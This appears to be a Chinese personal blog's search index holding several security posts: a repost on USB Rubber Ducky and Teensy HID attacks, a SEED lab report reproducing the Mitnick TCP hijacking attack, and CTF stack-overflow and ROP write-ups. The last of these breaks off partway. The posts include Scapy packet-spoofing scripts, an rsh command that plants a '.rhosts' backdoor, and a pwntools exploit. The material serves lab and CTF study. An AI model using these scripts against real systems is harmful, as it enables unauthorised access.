<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>My First Blog</title>
    <url>/posts/8a2ade14.html</url>
    <content><![CDATA[<p>Creat a small Utopia in the Internet.</p>
]]></content>
  </entry>
  <entry>
    <title>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</title>
    <url>/posts/30b50265.html</url>
    <content><![CDATA[<h1 id="BadUSB的前世今生：USB-RUBBER-DUCKY和Teensy-USB"><a href="#BadUSB的前世今生：USB-RUBBER-DUCKY和Teensy-USB" class="headerlink" title="BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB"></a>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</h1><p>本文转载自[BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB](<a href="https://cloud.tencent.com/developer/article/1036206">BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)</p>
<p><strong>一、介绍</strong></p>
<p>前段时间翻译了有关BadUSB的两篇文章《解密BadUSB：世界上最邪恶的USB外设》和《研究人员公布BadUSB攻击测试（exploit）代码》，大家反应强烈，很多人都在打听BadUSB的实现方法，或者从那里可以买到这样的U盘。原本打算本周写一篇分析已公开的BadUSB利用代码，兑现一下诺言，但实在是抽不出时间。在此先给大家介绍一下BadUSB的“老前辈”：USB RUBBER DUCKY和Teensy，满足一下大家的好奇心。USB RUBBER DUCKY和Teensy都可用于实施HID模拟攻击，其中USB RUBBER DUCKY入手简单，傻瓜式操作，但价格不菲啊；而Teensy USB性价比比较高，也可用来制作各种酷炫的DIY。</p>
<p><strong>二、USB RUBBER DUCKY（USB 橡皮鸭）</strong></p>
<p><strong>1.介绍</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ed4ijlzf2s.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB RUBBER DUCKY（USB 橡皮鸭）是最早的按键注入工具。自2010年以来，USB橡皮鸭就一直深受黑客、<a href="https://cloud.tencent.com/product/wpt?from=20065&from_column=20065">渗透测试</a>人员以及IT专家的欢迎。USB 橡皮鸭最初作为一个IT自动化概念验证（POC），通过嵌入式开发板实现的，后来它发展成为一个完全成熟的商业化按键注入攻击平台。USB橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装成功俘获了黑客的“芳心”。（谁能想到这么可爱的大黄鸭）</p>
<p>不管是笔记本、台式机、平板以及智能手机，几乎每个计算机都通过键盘获得输入。这就是为什么会有一个无处不在的USB标准HID或人机接口设备（Human Interface Device）。任何一个宣称是键盘HID的设备都能够被大多数操作系统自动的探测和接入。不管它是Windows、Mac或安卓设备，键盘就是老大。</p>
<p><strong>Freebuf小科普</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">HID</span>（<span class="title class_">Human</span> <span class="title class_">Interface</span> <span class="title class_">Device</span>）人机接口设备类别是<span class="title class_">Windows</span>最早支持的<span class="variable constant_">USB</span>类别。由其名称可以了解<span class="variable constant_">HID</span>设备是计算机直接</span><br><span class="line">与人交互的设备，例如键盘、鼠标和游戏杆等。不过<span class="variable constant_">HID</span>设备不一定要有人机接口，只要符合<span class="variable constant_">HID</span>类别规范，就都是<span class="variable constant_">HID</span>设备。</span><br></pre></td></tr></table></figure>

<p>复制</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/shli98ytmx.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB橡皮鸭的名字和背后的原理都源自美国一句俗语“ If it looks like a duck,quacks like a duck and walks like a duck,it’s a duck”（意思就是如果走路和叫声都像鸭子,那就是鸭子）。人类使用键盘，而计算机相信人类，进而推论出计算机相信键盘。结合计算机对键盘的固有信任和速度超过1000字&#x2F;分钟的通过脚本模拟的按键操作，传统的安全对策都能够被USB橡皮鸭轻易的绕过，即<strong>HID模拟攻击</strong>。</p>
<p><strong>2.特点</strong></p>
<p><strong>1).简单易用的脚本语言</strong></p>
<p>USB 橡皮鸭所使用的脚本语言Duckyscript简单易用，编写payload并不需要任何编程经验。而且现支持在线定制Payload：<a href="http://www.ducktoolkit.com/Home.jsp%E3%80%82%E5%8F%AA%E9%9C%80%E8%A6%81%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%89%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%9B%E5%BB%BA%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84Payload%EF%BC%9A">http://www.ducktoolkit.com/Home.jsp。只需要简单的三个步骤，就可以创建功能强大的Payload：</a></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/b04ikzq8e6.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>USB 橡皮鸭已有的Payload模块如下表所示：</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/wfj19szsx9.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p><strong>2).功能强大的定制硬件</strong></p>
<p>USB 橡皮鸭使用自定制的硬件设备，具有更大的处理能力和功能性多样化，硬件当然是收费的——39.99$。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/kym8q93sqw.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>硬件特点：</p>
<p>①快速的60MHZ 32位处理器</p>
<p>②便捷的Type A USB连接器</p>
<p>③可通过Micro SD卡扩展内存</p>
<p>④隐藏在不起眼的外壳中</p>
<p>⑤内置载荷重按钮</p>
<p><strong>3).跨平台特性</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/qrbeq5wvtg.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>不管是Windows、Linux、Mac还是Android（当然是不算触摸屏了），各个系统平台所遵守的USB标准都是一致的。所以USB RUBBER DUCKY自然而然就具有了跨平台的特点。</p>
<p><strong>4).活跃的交流社区</strong></p>
<p>USB RUBBER DUCKY拥有自己社区版固件、编码器以及工具箱，具有良好的交流沟通平台：</p>
<p><a href="https://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/">https://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/</a></p>
<p><strong>3.攻击测试步骤</strong></p>
<p>①下载网站生成的inject.bin载荷文件；</p>
<p>②把文件microSD卡的根目录；</p>
<p>③把microSD卡插入到USB橡皮鸭</p>
<p>④在USB橡皮鸭插入到目标系统中</p>
<p>⑤当看到命令提示窗口时，移除USB橡皮鸭；</p>
<p><strong>三、Teensy USB</strong></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ai7k06jlz9.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程都是通过USB端口进行的。不需要特殊的编程器，只需要一个标准的Mini-B USB线缆、一台带有USB口的PC机或Macintosh机。</p>
<p><strong>主要特点</strong>：</p>
<p>①可以变身为任意类型的设备</p>
<p>②AVR处理器，16 MHz</p>
<p>③单按钮编程</p>
<p>④易于使用的Teensy Loader应用程序</p>
<p>⑤免费软件开发工具</p>
<p>⑥兼容Mac OS X，Linux和Windows</p>
<p>⑦便携,许多项目的完美支持</p>
<p>⑧使用标签面包板</p>
<p>⑨非常低的成本</p>
<p>你可能问我Teensy能干什么？我会说，你应该问我Teensy不能干什么！，装X必备的神器之一。</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/ldd1fn950p.jpeg?imageView2/2/w/2560/h/7000" alt="img"></p>
<p>关于Teensy如何实现HID模拟攻击，我就不贴具体内容了，详情大家可以查看一下文章：</p>
<ol>
<li>一个U盘黑掉你：HID攻击之TEENSY实战</li>
<li><a href="http://sec.chinabyte.com/410/13056910.shtml">http://sec.chinabyte.com/410/13056910.shtml</a></li>
<li></li>
<li>Teensy HID新型攻击方式（Kautilya渗透测试套件）</li>
</ol>
<p><strong><a href="http://www.xocoder.com/archives/1328">http://www.xocoder.com/archives/1328</a></strong> </p>
<p><strong>四、总结</strong></p>
<p>HID（Human Interface Devices）攻击当前不流行，但是攻击方式很新颖，实用性很高，危险系数应该还是比较高的，值得研究。BadUSB公布的利用代码借鉴了以上两个项目中的一些思路，但这两个项目和BadUSB还是有比较大的区别：</p>
<p>①USB RUBBER DUCKY和Teensy都需要定制的硬件设备，通用性差，而BadUSB针对的是通用的USB设备；</p>
<p>②USB RUBBER DUCKY和Teensy不能够自动复制传播，仅实现了从USB设备-&gt;计算机的单向感染途径，缺少计算机-&gt;USB设备的感染途径，仅适用于定点攻击（Targeted attack），危害程度大大削弱；</p>
<p>③USB RUBBER DUCKY和Teensy可以实现HID模拟攻击，尚未实现插入恶意代码的功能；</p>
<p><strong>参考链接：</strong></p>
<p><strong>1.USB Rubber Ducky主页：<a href="http://192.64.85.110/index.php">http://192.64.85.110/index.php</a></strong></p>
<p><strong>2.Teensy USB Development Board：<a href="http://www.pjrc.com/teensy/">http://www.pjrc.com/teensy/</a></strong></p>
<p><strong>3.一个U盘黑掉你：HID攻击之TEENSY实战：<a href="http://sec.chinabyte.com/410/13056910.shtml">http://sec.chinabyte.com/410/13056910.shtml</a></strong></p>
<p><strong>4.Teensy HID新型攻击方式（Kautilya渗透测试套件）<a href="http://www.xocoder.com/archives/1328">http://www.xocoder.com/archives/1328</a></strong></p>
<p><strong>[原文作者Rabbit_Run，喜欢文章请点赞鼓励。转载请注明来自FreeBuf.COM。免责声明：以上介绍的技术仅作为测试验证目的]</strong></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>鼠标右键添加新建md文档</title>
    <url>/posts/feb04467.html</url>
    <content><![CDATA[<h2 id="鼠标右键添加新建-md文档"><a href="#鼠标右键添加新建-md文档" class="headerlink" title="鼠标右键添加新建.md文档"></a>鼠标右键添加新建.md文档</h2><p>直接上链接：</p>
<p><a href="%5B(36%E6%9D%A1%E6%B6%88%E6%81%AF">鼠标右键添加新建.md文档（亲测有效）</a> Windows下右键新建.md文件教程（转）_右键新建md文件_MercyDean的博客-CSDN博客](<a href="https://blog.csdn.net/qq_43564374/article/details/109471694">https://blog.csdn.net/qq_43564374/article/details/109471694</a>))</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>MITNICK攻击实验</title>
    <url>/posts/7fdadce9.html</url>
    <content><![CDATA[<h1 id="MITNICK攻击实验"><a href="#MITNICK攻击实验" class="headerlink" title="MITNICK攻击实验"></a>MITNICK攻击实验</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>KEVIN·MITNICK可能是美国最著名的黑客之一，他在联邦调查局的通缉犯名单上。在逃亡期间，他开始对破解移动网络产生了兴趣，并需要专门的软件来帮助他做到这一点。这让他找到了圣地亚哥超级计算机中心的研究员TSUTOMU SHIMOMURA，移动电话网络安全方面的主要研究人员之一。他有MITNICK想要的代码。</p>
<p>1994年，MITNICK利用TCP协议中的漏洞和SHIMOMURA的两台计算机之间的受信任关系，成功地对SHIMOMURA的计算机发动了一次攻击。这次袭击引发了两人之间的对决，并最终导致了MITNICK的被捕。这场对决后来被演变成书籍和好莱坞电影。这次攻击现在被称为MITNICK攻击，这是一种特殊类型的TCP会话劫持。</p>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>这个实验的目的是重现经典的MITNICK攻击，这样学生们就可以获得这种攻击的第一手经验。我们将模拟最初在SHIMOMURA电脑上的设置，然后启动MITNICK攻击，在SHIMOMURA的两台电脑之间创建一个伪造的TCP会话。如果攻击成功了，我们应该能够在SHIMOMURA的计算机上运行任何命令</p>
<h2 id="实验主题"><a href="#实验主题" class="headerlink" title="实验主题"></a>实验主题</h2><ul>
<li><p>TCP会话劫持攻击</p>
</li>
<li><p>TCP三次握手协议</p>
</li>
<li><p>MITNICK攻击</p>
</li>
<li><p>远程SHELL RSH</p>
</li>
<li><p>数据包嗅探与伪造</p>
</li>
</ul>
<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h4 id="1-使用docker容器建立实验环境"><a href="#1-使用docker容器建立实验环境" class="headerlink" title="1. 使用docker容器建立实验环境"></a>1. 使用docker容器建立实验环境</h4><p>在网站<a href="http://202.120.1.66:1068/">Home</a>下载相关的环境安装包，然后再Ubuntu系统中打开。使用命令<code>docker-compose up</code>完成环境搭建以及容器启动。</p>
<p><img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/environment.png" alt="environment"></p>
<h4 id="2-配置X-Terminal"><a href="#2-配置X-Terminal" class="headerlink" title="2. 配置X-Terminal"></a>2. 配置X-Terminal</h4><p>使用<code>docker exec -it [container-ID] /bin/bash</code>命令进入<code>x-terminal</code>主机，创建.rhost文件，添加<code>trust_server</code>主机IP地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">cd ~</span><br><span class="line">touch .rhosts</span><br><span class="line">echo 10.9.0.6 &gt; .rhosts</span><br><span class="line">chmod 644 .rhosts</span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/x_terminal_rsh_config.png" alt="x_terminal_rsh_config"></p>
<p>配置完成后，使用<code>Trust Server</code>主机进行<code>rsh</code>登录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su seed</span><br><span class="line">rsh 10.9.0.5 date</span><br></pre></td></tr></table></figure>

<p> <img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/x_terminal_rsh_config_verify.png" alt="x_terminal_rsh_config_verify"></p>
<p>另外还需要设置<code>arp</code>长期缓存，因为如果在进行<code>mitnick</code>攻击时，如果<code>X-Terminal</code>主机中没有<code>Trust Server</code>主机的<code>arp</code>缓存，<code>X-Terminal</code>会发出<code>arp</code>报文请求<code>Trust Server</code>MAC地址，然而<code>Trust Server</code>由于收到<code>SYN FLOODING</code>攻击无法给予回复，导致攻击无法继续向下进行。</p>
<h4 id="3-模拟SYN-FLOODING攻击"><a href="#3-模拟SYN-FLOODING攻击" class="headerlink" title="3. 模拟SYN FLOODING攻击"></a>3. 模拟SYN FLOODING攻击</h4><p>由于当前主机都可以很好的防护SYN FLOODING攻击，可以直接关闭<code>Trust Server</code>主机来模拟SYN FLOODING攻击成功。</p>
<h4 id="4-建立第一个TCP连接——伪造SYN包"><a href="#4-建立第一个TCP连接——伪造SYN包" class="headerlink" title="4. 建立第一个TCP连接——伪造SYN包"></a>4. 建立第一个TCP连接——伪造SYN包</h4><p>令<code>Trust Server</code>主机rsh远程登录<code>X-Terminal</code>主机，tcpdump查看包交互过程，如下图，可见<code>10.9.0.5</code>与<code>10.9.0.6</code>之间建立了两次TCP连接（<code>10.9.0.5:514 &lt;-&gt; 10.9.0.6:1023</code>, <code>10.9.0.5:1023 &lt;-&gt; 10.9.0.6:1022</code>）</p>
<p><img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/tcp_dump.png" alt="tcp_dump"></p>
<p><code>mitnick</code>攻击实验进行TCP连接过程如下图：</p>
<p><img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/TCP.png" alt="TCP"></p>
<p>使用<code>python scapy</code>库构造脚本，伪造SYN包，向<code>X-Terminal</code>伪造<code>Trust Server</code>发送SYN包，尝试建立连接。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.发送第一个SYN包</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">1023</span>, dport=<span class="number">514</span>)</span><br><span class="line">tcp.flags = <span class="string">&quot;S&quot;</span></span><br><span class="line">p = ip / tcp</span><br><span class="line">send(p, verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>构造ip头以及tcp，注意tcp源端口需要为”1023”，标志位需要为”S”，向<code>X-Terminal</code>主机发送SYN包。</p>
<h4 id="5-建立第一个TCP连接——伪造SYN-ACK响应包"><a href="#5-建立第一个TCP连接——伪造SYN-ACK响应包" class="headerlink" title="5. 建立第一个TCP连接——伪造SYN-ACK响应包"></a>5. 建立第一个TCP连接——伪造SYN-ACK响应包</h4><p>发送SYN包后，<code>X-Terminal</code>会发送SYN+ACK响应包，<code>Attacker</code>主机需要伪造ACK响应包回复。其中包含了 ip, tcp, data等信息，data数据中包含了<code>touch /home/seed/xyz</code>命令。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.伪造SYN+ACK响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;SA&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">1023</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;A&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].ack</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line">        <span class="comment"># 伪造rsh数据包</span></span><br><span class="line">        data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br><span class="line">        p = ip / tcp / data</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific</span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>

<p>进行sniff嗅探<code>X-Terminal</code>主机发送的SYN+ACK包，根据该包构造ip头和tcp头，设置标志位为”A”表示ACK包，注ack序号应为SYN+ACK包的<code>seq+1</code>，并添加rsh data数据段，添加命令，命令格式为<code>[port_number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00</code>  。</p>
<p>数据包括四个部分：一个端口号、 一个客户端的用户ID、 一个服务器的用户ID和一个命令。该端口号将用于第二个连接。 客户端和服务器的用户ID在本实验中都为”seed” 。 这四个字段用一个字节0分隔。</p>
<h4 id="6-建立第二个TCP连接——伪造ACK包"><a href="#6-建立第二个TCP连接——伪造ACK包" class="headerlink" title="6. 建立第二个TCP连接——伪造ACK包"></a>6. 建立第二个TCP连接——伪造ACK包</h4><p>建立第一个连接后，X-Terminal将启动第二次连接，rshd使用此连接来发送错误消息。在本实验中，这个连接不 会被使用。但如果这个连接没有建立，rshd将停止而不执行命令。因此，需要伪造第二个连接来确保命令的执行。  </p>
<p>编写另一个程序，嗅探发送到可信服务器9090端口的TCP流量（假设之前使用9090端口）。当嗅探到一个SYN包时，应该用一个SYN+ACK包来响应。</p>
<p>如果两个连接都已成功建立， 则rshd将执行包含在rsh数据包中的命令。 检查&#x2F;home&#x2F;seed&#x2F;文件夹， 并查看是否创建了&#x2F;home&#x2F;seed&#x2F;， 以及其时间戳是否与当前的时间相匹配 。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.伪造SYN响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;S&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">9090</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;SA&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].seq</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        p = ip / tcp</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific      </span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>

<p>进行sniff嗅探<code>X-Terminal</code>主机发送第二次TCP连接的SYN包，根据该包构造ip头和tcp头，设置标志位为”SA”表示SYN+ACK包，注意ack序号应为SYN包的<code>seq+1</code>，seq序号可以随意设计。</p>
<p>进行tcpdump查看包交互过程：</p>
<p><img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/sniff.png" alt="sniff"></p>
<p><strong>结果检验：</strong></p>
<p><img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/results.png" alt="results"></p>
<h4 id="7-设置后门"><a href="#7-设置后门" class="headerlink" title="7. 设置后门"></a>7. 设置后门</h4><p>为了避免每次侵入X-Terminal都需要发动攻击， 可以在X-Terminal上设置一个后门，这个后门允许攻击者无需输入密码就能在任何时候正常地登录到X-Terminal。实现这个后门需要做的就是将字符串“+ +” 添加到X-Terminal的 .rhosts 文件中，将脚本中data数据段命令修改为<code>echo + + &gt; /home/seed/.rhosts</code>即可。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>成功修改了<code>.rhosts</code>文件</p>
<p><img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/result1.png" alt="result1"></p>
<p>使用攻击主机进行rsh登录，成功返回日期时间</p>
<p><img src="/img/posts/2023-10-09-mitnick%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/images/result2.png" alt="result2"></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过本次实验，我了解了当时mitnick进行攻击的具体过程以及实现原理。并且能够简单复现该攻击实验，并且熟练掌握了docker的使用方法。</p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>mitnick</tag>
        <tag>实验报告</tag>
        <tag>seed_lab</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Pwn1</title>
    <url>/posts/c5e9e263.html</url>
    <content><![CDATA[<h1 id="CTF-Pwn1"><a href="#CTF-Pwn1" class="headerlink" title="CTF-Pwn1"></a>CTF-Pwn1</h1><ul>
<li>首先使用<code>checksec</code>工具进行检查：</li>
</ul>
<p><img src="/img/posts/2023-10-08-pwn1/images/checksec.png" alt="checksec"></p>
<p><img src="/img/posts/2023-10-08-pwn1/images/file.png" alt="file"></p>
<p>​		可以发现，<code>pwn1</code>程序为32位，仅开启了DEP保护，动态链接。</p>
<ul>
<li>然后使用ida64打开进行静态分析，可见<code>stack_overflow</code>函数存在漏洞，可以进行栈溢出攻击。</li>
</ul>
<p><code>main</code>：</p>
<p><img src="/img/posts/2023-10-08-pwn1/images/main.png" alt="main"></p>
<p><code>stack_flow</code>：</p>
<p><img src="/img/posts/2023-10-08-pwn1/images/stack_flow.png" alt="stack_flow"></p>
<p><code>call_me</code>：</p>
<p><img src="/img/posts/2023-10-08-pwn1/images/call_me.png" alt="call_me"></p>
<p>​		另外，发现内部有<code>call_me</code>函数，可知需要通过栈溢出覆盖返回地址为<code>call_me</code>函数地址。</p>
<ul>
<li>上述函数地址：</li>
</ul>
<table>
<thead>
<tr>
<th>函数名</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td><code>main</code></td>
<td>0x080484C2</td>
</tr>
<tr>
<td><code>stack_flow</code></td>
<td>0x08048494</td>
</tr>
<tr>
<td><code>call_me</code></td>
<td>0x0804846B</td>
</tr>
</tbody></table>
<ul>
<li>使用gdb工具进行调试，可以查看栈的情况。<img src="/img/posts/2023-10-08-pwn1/images/stack.png" alt="stack"></li>
<li>构造python脚本进行动态调试：</li>
</ul>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">call_me = <span class="number">0x0804846B</span></span><br><span class="line">leave = <span class="number">0x080484C0</span></span><br><span class="line"></span><br><span class="line">retn = <span class="number">0x080484F4</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>), retn, call_me)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please finish pwn1!&quot;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *0x080484C0&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>最终成功执行<code>call_me</code>函数，获取shell。</li>
</ul>
<p><img src="/img/posts/2023-10-08-pwn1/images/result.png" alt="result"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>逆向</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>1stStep</title>
    <url>/posts/d053c6e6.html</url>
    <content><![CDATA[<h3 id="1stStep"><a href="#1stStep" class="headerlink" title="1stStep"></a>1stStep</h3><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul>
<li>ida、ROPgadget工具的使用</li>
<li>多次栈溢出攻击的原理的理解</li>
<li>对汇编语言的理解</li>
</ul>
<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
<li>使用<code>checksec、file</code>工具查看文件<code>./1stStep</code>信息：</li>
</ul>
<p><img src="/img/posts/2023-10-23-1stStep/images/checksec.png" alt="checksec"></p>
<p><img src="/img/posts/2023-10-23-1stStep/images/file.png" alt="file"></p>
<p>​		可见<code>./1stStep</code>文件为64位程序，启动了DEP保护，使用静态链接。</p>
<ul>
<li><p>使用<code>ida</code>工具打开文件，进行反编译，<code>main</code>函数如下，可见main函数内有两个函数banner、vuln，查看两个函数内部逻辑。</p>
<p><code>main</code></p>
</li>
</ul>
<p><img src="/img/posts/2023-10-23-1stStep/images/main.png" alt="main"></p>
<p>​		<code>banner</code>：输出提示信息</p>
<p><img src="/img/posts/2023-10-23-1stStep/images/banner.png" alt="banner"></p>
<p>​		<code>vuln</code>：接收用户输入，<code>read</code>函数存在栈溢出漏洞。</p>
<p><img src="/img/posts/2023-10-23-1stStep/images/vuln.png" alt="vuln"></p>
<ul>
<li>经过<code>ida</code>静态分析，发现文件内部并没有<code>system</code>和<code>&quot;/bin/sh&quot;</code>字符串可供利用，因此尝试通过寻找<code>syscall</code>函数来执行命令<code>exceve(&quot;/bin/sh&quot;, 0, 0)</code>，<code>exceve</code>命令为<code>0x3d</code>，<code>&quot;/bin/sh&quot;</code>命令可以通过<code>read</code>函数传入文件数据存储区域中（<code>.bss</code>或<code>.data</code>，要求可读可写）。通过<code>ida</code>工具获取重要地址，通过<code>ROPgadget</code>工具获取<code>pop rdi, ret</code>等片段的地址：</li>
</ul>
<table>
<thead>
<tr>
